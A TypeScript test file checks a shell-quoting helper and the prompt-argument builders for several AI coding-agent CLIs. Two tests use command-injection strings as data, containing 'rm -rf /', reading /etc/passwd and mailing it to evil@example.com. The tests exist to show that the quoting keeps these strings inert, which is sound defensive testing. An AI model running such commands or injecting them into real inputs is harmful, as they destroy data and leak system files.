import { describe, it, expect } from "vitest";
import { shellQuote } from "../../../src/services/hook-adapters/shared.js";
import {
  getAdapterInitialPromptArgs,
  adapterHasInitialPromptArgs,
} from "../../../src/services/hook-adapters/index.js";

// Task Master's fix for the claimed-task-never-starts-a-turn bug: a prompt
// is delivered as argv (initialPromptArgs), never through stashSeed's
// SessionStart `additionalContext`, which injects context but never submits
// a turn. See task-claim.ts's own doc comment for the full story.
describe("shellQuote", () => {
  it("wraps a plain string in single quotes", () => {
    expect(shellQuote("hello world")).toBe("'hello world'");
  });

  it("escapes an embedded single quote as close-escape-reopen", () => {
    expect(shellQuote("it's a test")).toBe("'it'\\''s a test'");
  });

  it("leaves shell metacharacters inert inside the quotes", () => {
    // ; & | < > ` $ are all shell-significant outside single quotes, and
    // none of them terminate or escape inside them — the whole point of
    // this quoting form.
    const dangerous = "rm -rf /; echo pwned & cat /etc/passwd | mail evil@example.com < /dev/null";
    expect(shellQuote(dangerous)).toBe(`'${dangerous}'`);
  });

  it("round-trips embedded newlines untouched", () => {
    const withNewline = "line one\nline two";
    expect(shellQuote(withNewline)).toBe(`'${withNewline}'`);
  });

  it("handles multiple embedded single quotes", () => {
    expect(shellQuote("a'b'c")).toBe("'a'\\''b'\\''c'");
  });
});

describe("getAdapterInitialPromptArgs / adapterHasInitialPromptArgs", () => {
  // Hermes review, PR #538 — claude/codex both prepend a `--`
  // end-of-options marker, and agy uses `-i=<value>` rather than a
  // space-separated `-i <value>`, so a task title/prompt starting with `-`
  // (e.g. "- fix X") doesn't get parsed as an unrecognized option/flag —
  // verified live against all three CLIs (see each adapter's own doc
  // comment for the exact failure this fixes).
  it("returns a `--`-prefixed shell-quoted trailing positional for claude", () => {
    expect(getAdapterInitialPromptArgs("claude", "fix the bug")).toBe("-- 'fix the bug'");
    expect(adapterHasInitialPromptArgs("claude")).toBe(true);
  });

  it("returns a `--`-prefixed shell-quoted trailing positional for codex", () => {
    expect(getAdapterInitialPromptArgs("codex", "fix the bug")).toBe("-- 'fix the bug'");
    expect(adapterHasInitialPromptArgs("codex")).toBe(true);
  });

  it("returns a -i=<value> pair for agy", () => {
    expect(getAdapterInitialPromptArgs("agy", "fix the bug")).toBe("-i='fix the bug'");
    expect(adapterHasInitialPromptArgs("agy")).toBe(true);
  });

  it("returns null for opencode — no initial-prompt argv form exists", () => {
    expect(getAdapterInitialPromptArgs("opencode", "fix the bug")).toBeNull();
    expect(adapterHasInitialPromptArgs("opencode")).toBe(false);
  });

  it("returns null for an unmatched/unknown command", () => {
    expect(getAdapterInitialPromptArgs("bash", "fix the bug")).toBeNull();
    expect(adapterHasInitialPromptArgs("bash")).toBe(false);
  });

  it("quotes a prompt containing shell metacharacters safely for every seedable agent", () => {
    const dangerous = "task; rm -rf / && echo pwned | mail x < /dev/null > /tmp/out";
    expect(getAdapterInitialPromptArgs("claude", dangerous)).toBe(`-- '${dangerous}'`);
    expect(getAdapterInitialPromptArgs("codex", dangerous)).toBe(`-- '${dangerous}'`);
    expect(getAdapterInitialPromptArgs("agy", dangerous)).toBe(`-i='${dangerous}'`);
  });

  it("handles a prompt starting with a hyphen — the exact failure mode this fixes", () => {
    const leadingHyphen = "- fix the leading-hyphen bug";
    expect(getAdapterInitialPromptArgs("claude", leadingHyphen)).toBe(`-- '${leadingHyphen}'`);
    expect(getAdapterInitialPromptArgs("codex", leadingHyphen)).toBe(`-- '${leadingHyphen}'`);
    expect(getAdapterInitialPromptArgs("agy", leadingHyphen)).toBe(`-i='${leadingHyphen}'`);
  });

  it("path-qualified commands still match, mirroring matches()'s own anchoring", () => {
    expect(getAdapterInitialPromptArgs("/usr/local/bin/claude", "hi")).toBe("-- 'hi'");
  });
});
